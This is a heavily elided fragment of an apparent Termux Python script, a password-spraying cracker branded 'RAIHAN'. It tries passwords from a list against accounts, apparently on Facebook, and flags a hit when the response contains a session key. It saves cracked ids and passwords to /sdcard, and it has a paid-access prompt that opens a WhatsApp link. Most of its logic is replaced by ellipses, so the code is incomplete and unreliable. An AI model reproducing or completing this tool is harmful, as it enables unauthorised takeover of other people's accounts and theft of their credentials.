...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/01618921827?text={bumper}")
                        qsbuy()
...
class crack_main():
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[RAIHAN-OK] '+roid+' | '+pas+'\033[0;97m')
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/RAIHAN_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/RAIHAN' in datar:
        pass
else:
        for i in range(5000):
